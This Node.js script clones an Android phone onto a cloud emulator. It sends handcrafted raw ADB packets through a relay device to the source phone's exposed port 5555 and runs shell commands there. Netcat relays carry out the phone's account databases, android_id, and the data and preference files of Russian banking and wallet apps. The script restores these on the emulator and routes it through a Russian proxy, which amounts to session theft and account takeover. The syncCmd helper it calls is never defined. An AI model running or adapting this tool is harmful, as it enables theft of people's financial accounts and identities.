#!/usr/bin/env node
/**
 * Clone 10.0.26.220 → D2 (ACP251008GUOEEHB)
 * 
 * Method:
 *  - APKs: nc relay (.220 → D1 → local → D2)
 *  - App data/accounts: raw ADB OPEN via D1 (small files < 4KB)
 *  - Install on D2 via syncCmd chunked base64
 */

const { execSync } = require('child_process');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const { AK, SK, HOST, D1, D2, CT, SHD } = require('../shared/vmos_api');
const D1_SERIAL = 'localhost:8479';
const D1_IP = '10.0.96.174';
const SRC_IP = '10.0.26.220';
const OUT = path.join(__dirname, '..', 'output', 'clone_220_data');
const RELAY_PORT_BASE = 33400; // ports 33400+ for relay

const APPS = [
  'com.yandex.bank', 'ru.ozon.app.android', 'ru.ozon.fintech.finance',
  'com.wildberries.ru', 'ru.yandex.taxi', 'ru.yoo.money', 'ru.cupis.wallet',
  'ru.apteka', 'ru.getpharma.eapteka', 'ru.rostel', 'ru.vk.store',
  'com.app.trademo', 'com.trademo.massmo'
];

const log = m => console.log(`[${new Date().toISOString().slice(11,19)}] ${m}`);
const sleep = ms => new Promise(r => setTimeout(r, ms));
function ensureDir(d) { if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true }); return d; }

// ═══════════════════════════════════════════════════════════════
// VMOS Cloud API
// ═══════════════════════════════════════════════════════════════
function sign(b){const xd=new Date().toISOString().replace(/[-:]/g,'').replace(/\.\d{3}Z$/,'Z'),sd=xd.slice(0,8),CT='application/json;charset=UTF-8',SHD='content-type;host;x-content-sha256;x-date';const bh=crypto.createHash('sha256').update(b,'utf8').digest('hex');const can=`host:${HOST}\nx-date:${xd}\ncontent-type:${CT}\nsignedHeaders:${SHD}\nx-content-sha256:${bh}`;const ch=crypto.createHash('sha256').update(can,'utf8').digest('hex');const sts=`HMAC-SHA256\n${xd}\n${sd}/armcloud-paas/request\n${ch}`;let k=crypto.createHmac('sha256',SK).update(sd).digest();k=crypto.createHmac('sha256',k).update('armcloud-paas').digest();k=crypto.createHmac('sha256',k).update('request').digest();return{'content-type':CT,'x-date':xd,'x-host':HOST,'authorization':`HMAC-SHA256 Credential=${AK}, SignedHeaders=${SHD}, Signature=${crypto.createHmac('sha256',k).update(sts).digest('hex')}`};}

function apiPost(ep,d,t){return new Promise(ok=>{const b=JSON.stringify(d||{});const h=sign(b);const buf=Buffer.from(b);const req=https.request({hostname:HOST,path:ep,method:'POST',headers:{...h,'content-length':buf.length},timeout:(t||30)*1000},res=>{let r='';res.on('data',c=>r+=c);res.on('end',()=>{try{ok(JSON.parse(r));}catch{ok({raw:r.slice(0,300)});}});});req.on('timeout',()=>{req.destroy();ok({code:-99});});req.on('error',e=>ok({code:-99,msg:e.message}));req.write(buf);req.end();});}

// ═══════════════════════════════════════════════════════════════
// ADB helpers: build binary packets, run on .220 via D1
// ═══════════════════════════════════════════════════════════════
const CNXN_BUF = Buffer.from('434e584e00000001001000000700000032020000bcb1a7b1686f73743a3a00', 'hex');

function buildOpen(cmd) {
  const payload = Buffer.from('shell:' + cmd + '\x00');
  const hdr = Buffer.alloc(24);
  hdr.writeUInt32LE(0x4e45504f, 0);
  hdr.writeUInt32LE(1, 4);
  hdr.writeUInt32LE(0, 8);
  hdr.writeUInt32LE(payload.length, 12);
  let crc = 0; for (const b of payload) crc += b;
  hdr.writeUInt32LE(crc >>> 0, 16);
  hdr.writeUInt32LE((0x4e45504f ^ 0xFFFFFFFF) >>> 0, 20);
  return Buffer.concat([hdr, payload]);
}

// Push CNXN binary to D1 (one-time setup)
function setupD1() {
  fs.writeFileSync('/tmp/adb_cnxn.bin', CNXN_BUF);
  execSync(`adb -s ${D1_SERIAL} push /tmp/adb_cnxn.bin /sdcard/cnxn.bin 2>/dev/null`);
  log('D1 setup: cnxn.bin pushed');
}

// Run a shell command on .220 via raw ADB through D1 (returns first ~4KB of output)
function runOn220(cmd, waitSec = 3) {
  const open = buildOpen(cmd);
  fs.writeFileSync('/tmp/adb_open_tmp.bin', open);
  execSync(`adb -s ${D1_SERIAL} push /tmp/adb_open_tmp.bin /sdcard/open_tmp.bin 2>/dev/null`, { timeout: 10000 });
  
  try {
    const out = execSync(
      `adb -s ${D1_SERIAL} shell "(cat /sdcard/cnxn.bin; sleep 0.5; cat /sdcard/open_tmp.bin; sleep ${waitSec}) | nc -w ${waitSec + 2} ${SRC_IP} 5555 2>/dev/null | strings"`,
      { timeout: (waitSec + 8) * 1000, encoding: 'utf8', maxBuffer: 5 * 1024 * 1024 }
    );
    // Strip ADB protocol noise
    return out.split('\n')
      .filter(l => !l.match(/^(CNXN|OKAY|WRTE|CLSE|device::)/))
      .join('\n').trim();
  } catch (e) { return ''; }
}

// Pull a file from .220 to D1 via nc relay, then adb pull to local
function relayFile(remoteFilePath, localFilePath, port, timeoutSec = 30) {
  const cmd = `cat "${remoteFilePath}" | nc -w 10 ${D1_IP} ${port}`;
  const open = buildOpen(cmd);
  const openFile = `/tmp/adb_open_relay_${port}.bin`;
  fs.writeFileSync(openFile, open);
  execSync(`adb -s ${D1_SERIAL} push ${openFile} /sdcard/open_relay.bin 2>/dev/null`, { timeout: 10000 });

  // Write relay script
  const script = `#!/system/bin/sh
rm -f /sdcard/recv_${port}.bin
nc -l -p ${port} -w ${timeoutSec} > /sdcard/recv_${port}.bin &
LPID=$!
sleep 1
(cat /sdcard/cnxn.bin; sleep 0.5; cat /sdcard/open_relay.bin; sleep ${timeoutSec}) | nc -w ${timeoutSec + 2} ${SRC_IP} 5555 > /dev/null 2>&1
wait $LPID 2>/dev/null
sleep 1
wc -c < /sdcard/recv_${port}.bin 2>/dev/null
`;
  fs.writeFileSync(`/tmp/d1_relay_${port}.sh`, script);
  execSync(`adb -s ${D1_SERIAL} push /tmp/d1_relay_${port}.sh /sdcard/relay.sh 2>/dev/null`, { timeout: 10000 });

  try {
    const sizeStr = execSync(`adb -s ${D1_SERIAL} shell sh /sdcard/relay.sh`, {
      timeout: (timeoutSec + 15) * 1000, encoding: 'utf8'
    }).trim();
    const size = parseInt(sizeStr) || 0;
    if (size > 0) {
      execSync(`adb -s ${D1_SERIAL} pull /sdcard/recv_${port}.bin "${localFilePath}" 2>/dev/null`, { timeout: 30000 });
      return size;
    }
    return 0;
  } catch (e) { return 0; }
}

// Push a local file to D2 via syncCmd chunked base64
async function pushToD2(localFilePath, remoteFilePath) {
  const data = fs.readFileSync(localFilePath);
  const b64 = data.toString('base64');
  const CHUNK = 1400;
  const chunks = Math.ceil(b64.length / CHUNK);
  
  const tmpB64 = '/data/local/tmp/push_' + path.basename(remoteFilePath) + '.b64';
  
  for (let i = 0; i < chunks; i++) {
    const chunk = b64.slice(i * CHUNK, (i + 1) * CHUNK);
    const op = i === 0 ? '>' : '>>';
    const r = await syncCmd(D2, `echo -n '${chunk}' ${op} ${tmpB64}`, 10);
    if (r.startsWith('[ERR')) return false;
  }
  
  const r = await syncCmd(D2, `base64 -d ${tmpB64} > "${remoteFilePath}" 2>/dev/null; wc -c < "${remoteFilePath}"; rm -f ${tmpB64}`, 15);
  return !r.startsWith('[ERR');
}

// ═══════════════════════════════════════════════════════════════
// MAIN
// ═══════════════════════════════════════════════════════════════
async function main() {
  console.log('═'.repeat(60));
  console.log('  CLONE 10.0.26.220 → D2 (ACP251008GUOEEHB)');
  console.log('═'.repeat(60));

  ensureDir(OUT);
  ensureDir(path.join(OUT, 'apks'));
  ensureDir(path.join(OUT, 'data'));
  ensureDir(path.join(OUT, 'accounts'));

  // Verify D1 tunnel
  try {
    execSync(`adb -s ${D1_SERIAL} shell echo D1_OK`, { timeout: 5000, encoding: 'utf8' });
  } catch (e) {
    log('ERROR: D1 ADB tunnel not connected. Please reconnect first.');
    process.exit(1);
  }
  
  setupD1();

  // ════════════════════════════════════════════════════════════
  // PHASE 2A: Get APK paths from .220
  // ════════════════════════════════════════════════════════════
  log('\nPHASE 2A: Getting APK paths...');
  const apkPaths = {};
  for (const pkg of APPS) {
    const out = runOn220(`pm path ${pkg}`, 3);
    const match = out.match(/package:(.+)/);
    if (match) {
      apkPaths[pkg] = match[1].trim();
      log(`  ${pkg} → ${path.basename(path.dirname(apkPaths[pkg]))}`);
    } else {
      log(`  ${pkg} → NOT FOUND`);
    }
    await sleep(300);
  }

  // ════════════════════════════════════════════════════════════
  // PHASE 2B: Pull APKs via nc relay (.220 → D1 → local)
  // ════════════════════════════════════════════════════════════
  log('\nPHASE 2B: Pulling APKs via nc relay...');
  let port = RELAY_PORT_BASE;
  const pulledApks = [];
  
  for (const [pkg, apkPath] of Object.entries(apkPaths)) {
    const localFile = path.join(OUT, 'apks', `${pkg}.apk`);
    log(`  Pulling ${pkg}...`);
    
    const size = relayFile(apkPath, localFile, port, 45);
    if (size > 1000) {
      log(`  ✓ ${pkg}: ${(size / 1024).toFixed(0)} KB`);
      pulledApks.push(pkg);
    } else {
      log(`  ✗ ${pkg}: relay failed (${size} bytes)`);
    }
    port++;
    await sleep(500);
  }
  log(`  APKs pulled: ${pulledApks.length}/${Object.keys(apkPaths).length}`);

  // ════════════════════════════════════════════════════════════
  // PHASE 2C: Extract account databases
  // ════════════════════════════════════════════════════════════
  log('\nPHASE 2C: Extracting account databases...');
  
  for (const [name, rpath] of [
    ['accounts_ce.db', '/data/system_ce/0/accounts_ce.db'],
    ['accounts_de.db', '/data/system_de/0/accounts_de.db']
  ]) {
    const localFile = path.join(OUT, 'accounts', name);
    const size = relayFile(rpath, localFile, port, 15);
    if (size > 100) {
      log(`  ✓ ${name}: ${size} bytes`);
    } else {
      log(`  ✗ ${name}: not accessible`);
    }
    port++;
    await sleep(500);
  }

  // Account dump via raw ADB
  const acctDump = runOn220('dumpsys account 2>/dev/null | head -80', 4);
  fs.writeFileSync(path.join(OUT, 'accounts', 'account_dump.txt'), acctDump);
  log(`  Account dump: ${acctDump.split('\n').length} lines`);
  
  // android_id
  const androidId = runOn220('settings get secure android_id', 3);
  fs.writeFileSync(path.join(OUT, 'identity.txt'), androidId.trim());
  log(`  android_id: ${androidId.trim()}`);

  // ════════════════════════════════════════════════════════════
  // PHASE 2D: Extract per-app data (databases + shared_prefs)
  // ════════════════════════════════════════════════════════════
  log('\nPHASE 2D: Extracting app data...');
  
  for (const pkg of APPS) {
    const appDir = ensureDir(path.join(OUT, 'data', pkg));
    
    // List databases
    const dbList = runOn220(`ls /data/data/${pkg}/databases/ 2>/dev/null`, 3);
    const dbs = dbList.split('\n').filter(l => l.trim() && l.trim().endsWith('.db'));
    
    if (dbs.length > 0) {
      ensureDir(path.join(appDir, 'databases'));
      for (const db of dbs.slice(0, 5)) {
        const dbName = db.trim();
        const remotePath = `/data/data/${pkg}/databases/${dbName}`;
        const localFile = path.join(appDir, 'databases', dbName);
        const size = relayFile(remotePath, localFile, port, 15);
        if (size > 0) log(`    ✓ ${pkg}/db/${dbName}: ${size}B`);
        port++;
        await sleep(300);
      }
    }

    // List shared_prefs
    const prefList = runOn220(`ls /data/data/${pkg}/shared_prefs/ 2>/dev/null`, 3);
    const prefs = prefList.split('\n').filter(l => l.trim() && l.trim().endsWith('.xml'));
    
    if (prefs.length > 0) {
      ensureDir(path.join(appDir, 'shared_prefs'));
      for (const pref of prefs.slice(0, 10)) {
        const prefName = pref.trim();
        const remotePath = `/data/data/${pkg}/shared_prefs/${prefName}`;
        const localFile = path.join(appDir, 'shared_prefs', prefName);
        const size = relayFile(remotePath, localFile, port, 10);
        if (size > 0) log(`    ✓ ${pkg}/prefs/${prefName}: ${size}B`);
        port++;
        await sleep(300);
      }
    }
    
    log(`  ${pkg}: done`);
  }

  // ════════════════════════════════════════════════════════════
  // PHASE 3: Install on D2
  // ════════════════════════════════════════════════════════════
  log('\n\nPHASE 3: Installing on D2...');
  
  // 3A: Install APKs
  log('\n[3A] Installing APKs...');
  for (const pkg of pulledApks) {
    const apkFile = path.join(OUT, 'apks', `${pkg}.apk`);
    const apkSize = fs.statSync(apkFile).size;
    
    if (apkSize < 1000) {
      log(`  ⚠ ${pkg}: too small (${apkSize}B), skip`);
      continue;
    }
    
    log(`  Installing ${pkg} (${(apkSize/1024).toFixed(0)}KB)...`);
    const ok = await pushToD2(apkFile, `/data/local/tmp/${pkg}.apk`);
    if (ok) {
      const result = await syncCmd(D2, `pm install -r -g "/data/local/tmp/${pkg}.apk" 2>&1; rm -f "/data/local/tmp/${pkg}.apk"`, 30);
      log(`    ${result.slice(0, 80)}`);
    } else {
      log(`    ✗ push failed`);
    }
    await sleep(500);
  }

  // 3B: Restore account databases
  log('\n[3B] Restoring account databases...');
  for (const [name, targetPath] of [
    ['accounts_ce.db', '/data/system_ce/0/accounts_ce.db'],
    ['accounts_de.db', '/data/system_de/0/accounts_de.db']
  ]) {
    const localFile = path.join(OUT, 'accounts', name);
    if (!fs.existsSync(localFile) || fs.statSync(localFile).size < 100) continue;
    
    const ok = await pushToD2(localFile, `/data/local/tmp/${name}`);
    if (ok) {
      const r = await syncCmd(D2, [
        `cp /data/local/tmp/${name} ${targetPath}`,
        `chown system:system ${targetPath}`,
        `chmod 600 ${targetPath}`,
        `rm -f /data/local/tmp/${name}`,
        `echo "OK: $(stat -c %s ${targetPath} 2>/dev/null) bytes"`
      ].join('; '), 15);
      log(`  ${name}: ${r}`);
    }
  }

  // 3C: Restore per-app data
  log('\n[3C] Restoring per-app data...');
  const dataDir = path.join(OUT, 'data');
  
  for (const pkg of fs.readdirSync(dataDir)) {
    const pkgDir = path.join(dataDir, pkg);
    if (!fs.statSync(pkgDir).isDirectory()) continue;
    
    // Stop app
    await syncCmd(D2, `am force-stop ${pkg} 2>/dev/null`, 5);

    // Restore databases
    const dbDir = path.join(pkgDir, 'databases');
    if (fs.existsSync(dbDir)) {
      await syncCmd(D2, `mkdir -p /data/data/${pkg}/databases`, 5);
      for (const db of fs.readdirSync(dbDir)) {
        const localFile = path.join(dbDir, db);
        if (fs.statSync(localFile).size < 10) continue;
        const ok = await pushToD2(localFile, `/data/data/${pkg}/databases/${db}`);
        if (ok) log(`    ✓ ${pkg}/db/${db}`);
      }
    }

    // Restore shared_prefs
    const prefsDir = path.join(pkgDir, 'shared_prefs');
    if (fs.existsSync(prefsDir)) {
      await syncCmd(D2, `mkdir -p /data/data/${pkg}/shared_prefs`, 5);
      for (const pref of fs.readdirSync(prefsDir)) {
        const localFile = path.join(prefsDir, pref);
        if (fs.statSync(localFile).size < 10) continue;
        const ok = await pushToD2(localFile, `/data/data/${pkg}/shared_prefs/${pref}`);
        if (ok) log(`    ✓ ${pkg}/prefs/${pref}`);
      }
    }

    // Fix ownership
    const uid = await syncCmd(D2, `stat -c %u /data/data/${pkg} 2>/dev/null`, 5);
    if (uid && !uid.startsWith('[') && uid.match(/^\d+$/)) {
      await syncCmd(D2, `chown -R ${uid}:${uid} /data/data/${pkg}/databases /data/data/${pkg}/shared_prefs 2>/dev/null`, 10);
    }
    log(`  ${pkg}: restored`);
  }

  // Trigger account refresh
  await syncCmd(D2, 'am broadcast -a android.accounts.LOGIN_ACCOUNTS_CHANGED 2>/dev/null', 10);
  log('  Account refresh broadcast sent');

  // ════════════════════════════════════════════════════════════
  // PHASE 4: Russian Proxy
  // ════════════════════════════════════════════════════════════
  log('\n\nPHASE 4: Setting up proxy on D2...');
  
  // Check existing static proxies
  const existing = await apiPost('/vcpcloud/api/padApi/queryProxyList', { page: 1, rows: 10 });
  const proxies = existing?.data?.records || [];
  const ruProxy = proxies.find(p => p.proxyCountry === 'RU');
  
  if (ruProxy) {
    log(`  Found Russian proxy: ${ruProxy.proxyHost}:${ruProxy.proxyPort}`);
    const r = await apiPost('/vcpcloud/api/padApi/setProxy', {
      padCodes: [D2],
      proxyType: 'proxy',
      proxyName: 'socks5',
      proxyIp: ruProxy.proxyHost,
      proxyPort: ruProxy.proxyPort,
      proxyUser: ruProxy.username || '',
      proxyPassword: ruProxy.password || '',
    });
    log(`  setProxy: ${JSON.stringify(r).slice(0, 100)}`);
  } else {
    log('  No Russian proxy found in account.');
    if (proxies.length > 0) {
      const p = proxies[0];
      log(`  Using available proxy: ${p.proxyHost}:${p.proxyPort} (${p.proxyCountry})`);
      const r = await apiPost('/vcpcloud/api/padApi/setProxy', {
        padCodes: [D2],
        proxyType: 'proxy',
        proxyName: p.proxyName || 'socks5',
        proxyIp: p.proxyHost,
        proxyPort: p.proxyPort,
        proxyUser: p.username || '',
        proxyPassword: p.password || '',
      });
      log(`  setProxy: ${JSON.stringify(r).slice(0, 100)}`);
    }
    log('  → To buy Russian proxy: POST /vcpcloud/api/padApi/createProxyOrder { countryId: 1 }');
  }

  // ════════════════════════════════════════════════════════════
  // SUMMARY
  // ════════════════════════════════════════════════════════════
  console.log('\n' + '═'.repeat(60));
  console.log('  CLONE COMPLETE');
  console.log('═'.repeat(60));
  console.log(`  Source: ${SRC_IP} (Pixel 9)`);
  console.log(`  Target: D2 (${D2})`);
  console.log(`  APKs pulled: ${pulledApks.length}/${APPS.length}`);
  
  // Count extracted data files
  let dataFiles = 0;
  for (const pkg of APPS) {
    const d = path.join(OUT, 'data', pkg);
    if (fs.existsSync(d)) {
      const walk = (dir) => {
        for (const f of fs.readdirSync(dir)) {
          const fp = path.join(dir, f);
          if (fs.statSync(fp).isDirectory()) walk(fp);
          else dataFiles++;
        }
      };
      walk(d);
    }
  }
  console.log(`  Data files extracted: ${dataFiles}`);
  console.log(`  Output dir: ${OUT}`);
  console.log('═'.repeat(60));
}

main().catch(e => { console.error('FATAL:', e); process.exit(1); });
